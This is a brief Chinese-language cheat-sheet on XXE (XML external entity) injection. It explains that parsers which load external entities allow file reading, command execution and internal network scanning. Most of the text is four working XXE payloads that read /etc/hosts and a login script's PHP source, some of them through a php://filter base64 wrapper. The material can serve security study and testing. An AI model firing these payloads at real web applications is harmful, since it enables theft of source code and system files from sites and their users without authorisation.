请求响应的数据参数用XML传输，XXE发生在应用程序解XML输入时，没有禁止外部实体的加载导致可加载恶意外部文件，造成**文件读取**、命令执行（配合组件）、内网端口扫描攻击内网网站(SSRF的一种)等。
PS：libxml 2.9.0以后的默认不解析外部实体，现在大多数为2.9.4版本，可测试站长是否开启了解析外部实体。

^
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE a [
 <!ENTITY abc SYSTEM "file:///var/www/html/doLogin.php">
 ]>
<user><username>&abc;</username><password>123456</password></user>
```
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE a [
 <!ENTITY abc SYSTEM "file:///etc/hosts">
 ]>
<user><username>&abc;</username><password>123456</password></user>
```
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE a [
 <!ENTITY abc SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php">
 ]>
<user><username>&abc;</username><password>123456</password></user>

```


```
<!DOCTYPE ANY [
<!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts">
]>
<user><name>&x;</name></user>
```

